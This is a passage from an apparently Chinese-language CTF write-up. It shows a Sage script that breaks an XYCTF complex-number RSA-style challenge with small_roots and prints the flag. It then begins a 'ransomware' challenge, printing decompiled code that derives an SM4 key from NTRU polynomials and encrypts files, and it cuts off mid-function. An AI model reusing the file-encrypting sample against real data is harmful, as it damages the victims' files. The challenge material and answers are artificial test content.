        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>re_<span class="token punctuation">,</span> im_<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>re <span class="token operator">==</span> c<span class="token punctuation">.</span>re <span class="token keyword">and</span> self<span class="token punctuation">.</span>im <span class="token operator">==</span> c<span class="token punctuation">.</span>im

    <span class="token keyword">def</span> <span class="token function">__rshift__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>re <span class="token operator">>></span> m<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im <span class="token operator">>></span> m<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__lshift__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>re <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>re<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>re <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>im<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'-'</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>im<span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>re<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'+'</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'-'</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">abs</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>

    <span class="token keyword">def</span> <span class="token function">tolist</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>re<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">complex_pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> Complex<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> exp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> exp <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> result <span class="token operator">*</span> c
            result<span class="token punctuation">.</span>re <span class="token operator">=</span> result<span class="token punctuation">.</span>re <span class="token operator">%</span> n
            result<span class="token punctuation">.</span>im <span class="token operator">=</span> result<span class="token punctuation">.</span>im <span class="token operator">%</span> n
        c <span class="token operator">=</span> c <span class="token operator">*</span> c
        c<span class="token punctuation">.</span>re <span class="token operator">=</span> c<span class="token punctuation">.</span>re <span class="token operator">%</span> n
        c<span class="token punctuation">.</span>im <span class="token operator">=</span> c<span class="token punctuation">.</span>im <span class="token operator">%</span> n
        exp <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> result

n <span class="token operator">=</span> <span class="token number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span>
mh <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span><span class="token punctuation">,</span> <span class="token number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span><span class="token punctuation">]</span>
C <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span><span class="token punctuation">,</span> <span class="token number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span><span class="token punctuation">]</span>
enc <span class="token operator">=</span> <span class="token string">b'\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe'</span>

PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
a<span class="token operator">=</span>mh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>x
b<span class="token operator">=</span>mh<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>y
f1<span class="token operator">=</span>a<span class="token operator">^</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span>a<span class="token operator">*</span>b<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>C<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

roots<span class="token operator">=</span>small_roots<span class="token punctuation">(</span>f1<span class="token punctuation">,</span>bounds<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">129</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

m<span class="token operator">=</span>Complex<span class="token punctuation">(</span>mh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mh<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>re <span class="token operator">+</span> m<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">)</span>

dec<span class="token operator">=</span>ChaCha20<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>re <span class="token operator">+</span> m<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nonce<span class="token operator">=</span><span class="token string">b'Pr3d1ctmyxjj'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}</p>
</blockquote>
<h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>题目给出了exe和加密的16进制数据</p>
<p>pyinstxtractor反编译一下，编译task.pyc看到注释的代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> random <span class="token keyword">import</span> shuffle<span class="token punctuation">,</span> randrange

N <span class="token operator">=</span> <span class="token number">49</span> 
p <span class="token operator">=</span> <span class="token number">3</span>
q <span class="token operator">=</span> <span class="token number">128</span>  
d <span class="token operator">=</span> <span class="token number">3</span>
<span class="token keyword">assert</span> q <span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> p
R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> ZZ<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">generate_T</span><span class="token punctuation">(</span>d1<span class="token punctuation">,</span> d2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> N <span class="token operator">>=</span> d1 <span class="token operator">+</span> d2
    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> d1 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> d2 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>N <span class="token operator">-</span> d1 <span class="token operator">-</span> d2<span class="token punctuation">)</span>
    shuffle<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">invert_mod_prime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Rp <span class="token operator">=</span> R<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>Integers<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">^</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span>lift<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> Rp<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">convolution</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>f <span class="token operator">*</span> g<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token operator">^</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">lift_mod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> q <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> q<span class="token punctuation">)</span> <span class="token operator">-</span> q <span class="token operator">//</span> <span class="token number">2</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">poly_mod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> q <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">invert_mod_pow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> q<span class="token punctuation">.</span>is_power_of<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    g <span class="token operator">=</span> invert_mod_prime<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>g<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> g
        g <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">-</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span>randrange<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f <span class="token operator">=</span> generate_T<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>
            g <span class="token operator">=</span> generate_T<span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
            Fp <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>invert_mod_prime<span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
            Fq <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>invert_mod_pow2<span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    h <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>Fq<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> h<span class="token punctuation">,</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt_message</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">:</span>
    e <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>p <span class="token operator">*</span> convolution<span class="token punctuation">(</span>h<span class="token punctuation">,</span> generate_T<span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> m<span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e

<span class="token keyword">def</span> <span class="token function">save_ntru_keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    h<span class="token punctuation">,</span> secret <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pub_key.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> generate_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"priv_key.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
    e <span class="token operator">=</span> encrypt_message<span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"enc.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">terms</span><span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    terms <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    pattern <span class="token operator">=</span> <span class="token string">r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> poly_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> matches<span class="token punctuation">:</span>
        term <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+x'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> term <span class="token operator">==</span> <span class="token string">'-x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x^'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            exponent <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>coeff <span class="token operator">*</span> exponent<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+1'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> terms

<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    binary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">128</span>
    <span class="token keyword">for</span> term <span class="token keyword">in</span> poly_terms<span class="token punctuation">:</span>
        exponent <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> exponent <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">:</span>  
            binary<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> exponent<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    hex_key <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binary_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hex_key

<span class="token keyword">def</span> <span class="token function">read_polynomial_from_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sm4_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"SM4 key must be 16 bytes"</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>
    padded_plaintext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_plaintext<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sm4_encrypt_file</span><span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> output_path<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
